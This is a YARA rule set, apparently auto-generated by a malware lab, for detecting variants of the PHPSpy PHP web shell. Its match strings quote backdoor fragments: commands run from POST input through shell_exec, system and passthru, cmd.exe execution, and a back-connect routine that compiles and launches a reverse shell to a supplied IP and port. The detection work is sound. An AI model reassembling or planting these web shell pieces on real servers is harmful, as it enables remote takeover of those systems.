/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__phpspy
   Reference: php__phpspy php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Backdoor_PHP_Phpshy_a {
   meta:
      description = "php__phpspy - file Backdoor.PHP.Phpshy.a.m"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "5c7bdeb92735c0c9c3a0f9128dab3446e21c0b927be4a27dbb1a608a52117ef2"
   strings:
      $s1 = "| Thx FireFox (http://www.molyx.com)                                       |" fullword ascii /* score: '12.00'*/
      $s2 = "error_reporting(7);" fullword ascii /* score: '10.00'*/
      $s3 = "| Email: 4ngel@21cn.com                                                    |" fullword ascii /* score: '9.00'*/
      $s4 = "$starttime = $mtime[1] + $mtime[0];" fullword ascii /* score: '8.00'*/
      $s5 = "|        http://www.bugkidz.org                                            |" fullword ascii /* score: '5.00'*/
      $s6 = "| Team:  http://www.4ngel.net                                              |" fullword ascii /* score: '5.00'*/
      $s7 = "| http://www.4ngel.net                                                     |" fullword ascii /* score: '5.00'*/
      $s8 = "$admin['check'] = \"1\";" fullword ascii /* score: '4.00'*/
      $s9 = "$mtime = explode(' ', microtime());" fullword ascii /* score: '4.00'*/
      $s10 = "| str_replace(\".\", \"\", \"P.h.p.S.p.y\") Version:2006                         |" fullword ascii /* score: '2.00'*/
      $s11 = "/*===================== " fullword ascii /* score: '1.00'*/
      $s12 = "+--------------------------------------------------------------------------+" fullword ascii /* score: '1.00'*/
      $s13 = "| ======================================================================== |" fullword ascii /* score: '1.00'*/
      $s14 = "| Codz by Angel                                                            |" fullword ascii /* score: '1.00'*/
      $s15 = " =====================*/" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule Backdoor_PHP_Phpshy_a_2 {
   meta:
      description = "php__phpspy - file Backdoor.PHP.Phpshy.a.e"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "04a9e736eac78eff0b3863b6451fcc508829dbb65dde9db8c9a13540b76212ee"
   strings:
      $s1 = "$result=shell_exec($_POST['command']);" fullword ascii /* score: '22.00'*/
      $s2 = "if ($_POST['action'] == \"login\") {" fullword ascii /* score: '20.00'*/
      $s3 = "</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" title=\"" fullword ascii /* score: '20.00'*/
      $s4 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">http://www.4ngel.net</a> " fullword ascii /* score: '20.00'*/
      $s5 = "$result = exec($_POST['command']);" fullword ascii /* score: '20.00'*/
      $s6 = "header('Content-Description: PHP3 Generated Data');" fullword ascii /* score: '20.00'*/
      $s7 = "$info[37] = array(\"FTP\",getfun(\"ftp_login\"));" fullword ascii /* score: '20.00'*/
      $s8 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\"><" ascii /* score: '19.00'*/
      $s9 = " max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii /* score: '17.00'*/
      $s10 = "\",\"<a href=\\\"http://$_SERVER[SERVER_NAME]\\\" target=\\\"_blank\\\">$_SERVER[SERVER_NAME]</a>\");" fullword ascii /* score: '17.00'*/
      $s11 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\"><" ascii /* score: '16.00'*/
      $s12 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii /* score: '15.00'*/
      $s13 = "echo \"Processed in $totaltime second(s)\";" fullword ascii /* score: '15.00'*/
      $s14 = "system($_POST['command']);" fullword ascii /* score: '15.00'*/
      $s15 = "} elseif ($execfunc==\"passthru\") {" fullword ascii /* score: '15.00'*/
      $s16 = "}//end loginpage()" fullword ascii /* score: '15.00'*/
      $s17 = "passthru($_POST['command']);" fullword ascii /* score: '15.00'*/
      $s18 = "$adminmail=(isset($_SERVER[\"SERVER_ADMIN\"])) ? \"<a href=\\\"mailto:\".$_SERVER[\"SERVER_ADMIN\"].\"\\\">\".$_SERVER[\"SERVER_" ascii /* score: '15.00'*/
      $s19 = "loginpage();" fullword ascii /* score: '15.00'*/
      $s20 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule Backdoor_PHP_Phpshy_a_3 {
   meta:
      description = "php__phpspy - file Backdoor.PHP.Phpshy.a.s"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "ec61e14ef8ced80fbcf5b467fcf5bfcf6ca9656a5d1846bcc4ce333b7733407a"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii /* score: '46.00'*/
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii /* score: '37.00'*/
      $x3 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii /* score: '31.00'*/
      $s4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii /* score: '29.00'*/
      $s5 = "formhead(array('title'=>'Execute Command'));" fullword ascii /* score: '28.00'*/
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii /* score: '28.00'*/
      $s7 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii /* score: '26.00'*/
      $s8 = "echo(execute($command));" fullword ascii /* score: '26.00'*/
      $s9 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii /* score: '25.00'*/
      $s10 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii /* score: '25.00'*/
      $s11 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii /* score: '24.00'*/
      $s12 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii /* score: '24.00'*/
      $s13 = "formhead(array('title'=>'Execute Program'));" fullword ascii /* score: '23.00'*/
      $s14 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii /* score: '22.00'*/
      $s15 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii /* score: '21.00'*/
      $s16 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii /* score: '20.00'*/
      $s17 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii /* score: '20.00'*/
      $s18 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii /* score: '20.00'*/
      $s19 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii /* score: '20.00'*/
      $s20 = "p('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.for" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Backdoor_PHP_Phpshy_a_Backdoor_PHP_Phpshy_a_0 {
   meta:
      description = "php__phpspy - from files Backdoor.PHP.Phpshy.a.e, Backdoor.PHP.Phpshy.a.s"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "04a9e736eac78eff0b3863b6451fcc508829dbb65dde9db8c9a13540b76212ee"
      hash2 = "ec61e14ef8ced80fbcf5b467fcf5bfcf6ca9656a5d1846bcc4ce333b7733407a"
   strings:
      $s1 = "}//end loginpage()" fullword ascii /* score: '15.00'*/
      $s2 = "loginpage();" fullword ascii /* score: '15.00'*/
      $s3 = "function loginpage() {" fullword ascii /* score: '15.00'*/
      $s4 = "header('Content-Disposition: attachment; filename='.$filename);" fullword ascii /* score: '14.00'*/
      $s5 = "$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);" fullword ascii /* score: '12.00'*/
      $s6 = "$contents=@fread($fp, filesize($filename));" fullword ascii /* score: '12.00'*/
      $s7 = "<form method=\"POST\" action=\"\">" fullword ascii /* score: '9.00'*/
      $s8 = "$contents=htmlspecialchars($contents);" fullword ascii /* score: '9.00'*/
      $s9 = "}//end shell" fullword ascii /* score: '9.00'*/
      $s10 = "function getfun($funName) {" fullword ascii /* score: '9.00'*/
      $s11 = "while ($file=@readdir($dirs)) {" fullword ascii /* score: '7.00'*/
      $s12 = "while($file=$mydir->read())" fullword ascii /* score: '7.00'*/
      $s13 = "$mydir=@dir($deldir);" fullword ascii /* score: '4.00'*/
      $s14 = "function debuginfo() {" fullword ascii /* score: '4.00'*/
      $s15 = "function deltree($deldir) {" fullword ascii /* score: '4.00'*/
      $s16 = "global $starttime;" fullword ascii /* score: '4.00'*/
      $s17 = "}//end editfile" fullword ascii /* score: '4.00'*/
      $s18 = "$mydir->close(); " fullword ascii /* score: '4.00'*/
      $s19 = "$dirs=@opendir($dir);" fullword ascii /* score: '4.00'*/
      $s20 = "$file_i++;" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_Phpshy_a_Backdoor_PHP_Phpshy_a_1 {
   meta:
      description = "php__phpspy - from files Backdoor.PHP.Phpshy.a.m, Backdoor.PHP.Phpshy.a.e"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "5c7bdeb92735c0c9c3a0f9128dab3446e21c0b927be4a27dbb1a608a52117ef2"
      hash2 = "04a9e736eac78eff0b3863b6451fcc508829dbb65dde9db8c9a13540b76212ee"
   strings:
      $s1 = "| Email: 4ngel@21cn.com                                                    |" fullword ascii /* score: '9.00'*/
      $s2 = "|        http://www.bugkidz.org                                            |" fullword ascii /* score: '5.00'*/
      $s3 = "| Team:  http://www.4ngel.net                                              |" fullword ascii /* score: '5.00'*/
      $s4 = "| http://www.4ngel.net                                                     |" fullword ascii /* score: '5.00'*/
      $s5 = "+--------------------------------------------------------------------------+" fullword ascii /* score: '1.00'*/
      $s6 = "| ======================================================================== |" fullword ascii /* score: '1.00'*/
      $s7 = "| Codz by Angel                                                            |" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 80KB and ( all of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_Phpshy_a_Backdoor_PHP_Phpshy_a_Backdoor_PHP_Phpshy_a_2 {
   meta:
      description = "php__phpspy - from files Backdoor.PHP.Phpshy.a.m, Backdoor.PHP.Phpshy.a.e, Backdoor.PHP.Phpshy.a.s"
      author = "Comps Team Malware Lab"
      reference = "php__phpspy php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "5c7bdeb92735c0c9c3a0f9128dab3446e21c0b927be4a27dbb1a608a52117ef2"
      hash2 = "04a9e736eac78eff0b3863b6451fcc508829dbb65dde9db8c9a13540b76212ee"
      hash3 = "ec61e14ef8ced80fbcf5b467fcf5bfcf6ca9656a5d1846bcc4ce333b7733407a"
   strings:
      $s1 = "error_reporting(7);" fullword ascii /* score: '10.00'*/
      $s2 = "$starttime = $mtime[1] + $mtime[0];" fullword ascii /* score: '8.00'*/
      $s3 = "$mtime = explode(' ', microtime());" fullword ascii /* score: '4.00'*/
      $s4 = "/*===================== " fullword ascii /* score: '1.00'*/
      $s5 = " =====================*/" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

